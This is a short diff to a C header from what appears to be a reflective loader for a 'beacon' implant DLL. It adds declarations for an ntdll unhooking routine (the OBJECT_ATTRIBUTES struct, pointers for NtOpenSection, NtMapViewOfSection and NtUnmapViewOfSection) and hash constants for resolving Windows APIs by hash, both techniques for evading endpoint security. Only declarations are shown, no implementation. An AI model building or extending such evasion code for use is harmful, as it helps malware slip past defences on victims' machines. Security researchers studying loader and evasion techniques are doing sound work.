@@ -214,6 +214,15 @@ typedef PSTRING PCANSI_STRING;
 
 typedef CONST BYTE *PCSZ;
 
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
 // WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
 typedef struct _LDR_DATA_TABLE_ENTRY
 {
@@ -467,10 +476,14 @@ typedef struct APIS{
     PVOID pNtAllocateVirtualMemory;
     PVOID pNtProtectVirtualMemory;
     PVOID pNtFreeVirtualMemory;
-    tRtlLookupFunctionEntry RtlLookupFunctionEntry; 
+    PVOID pNtOpenSection;
+    PVOID pNtMapViewOfSection;
+    PVOID pNtUnmapViewOfSection;
+    tRtlLookupFunctionEntry RtlLookupFunctionEntry;
 }APIS;
 
 VOID getApis(APIS * api);
+BOOL unhook_ntdll(APIS* api, Dll* ntdll);
 VOID doSections(Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
 VOID doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
 VOID doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
@@ -570,6 +583,8 @@ PVOID xGetProcAddress_hash(DWORD api_hash, Dll * module);
 #define LDRGETPROCEDUREADDRESS       0x67c04785  // ldrgetprocedureaddress
 #define RTLFREEUNICODESTRING         0x4ec50e0e  // rtlfreeunicodestring
 #define RTLINITANSISTRING            0xe60378c2  // rtlinitansistring
+#define NTOPENSECTION                0x8b8f8bb5  // ntopensection
+#define NTMAPVIEWOFSECTION           0xb4c0ca1c  // ntmapviewofsection
 #define NTUNMAPVIEWOFSECTION         0xc4a552c4  // ntunmapviewofsection
 #define NTQUERYVIRTUALMEMORY         0x5d4bc34a  // ntqueryvirtualmemory
 #define LOADLIBRARYEXA               0xad631535  // loadlibraryexa
